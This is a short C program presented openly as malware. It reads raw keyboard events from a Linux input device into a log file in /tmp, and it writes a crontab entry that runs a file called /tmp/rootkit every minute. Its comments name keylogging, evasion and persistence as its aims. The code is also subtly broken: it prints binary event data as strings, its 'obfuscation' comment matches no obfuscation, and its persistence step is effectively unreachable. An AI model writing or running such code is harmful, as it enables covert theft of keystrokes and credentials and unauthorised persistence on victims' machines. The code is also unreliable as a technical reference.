#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

int main() {
    // Keylogger: Read keyboard input (requires root)
    int fd = open("/dev/input/event0", O_RDONLY);
    if (fd == -1) {
        perror("Open keyboard");
        return 1;
    }
    FILE *log = fopen("/tmp/keys.log", "a");
    char buf[16];
    while (read(fd, buf, sizeof(buf)) > 0) {
        fprintf(log, "Key event: %s\n", buf);  // Obfuscate for evasion
        fflush(log);
    }
    fclose(log);
    close(fd);
    
    // Persistence: Add to cron for auto-start
    system("echo '* * * * * /tmp/rootkit' >> /etc/crontab");
    return 0;
}
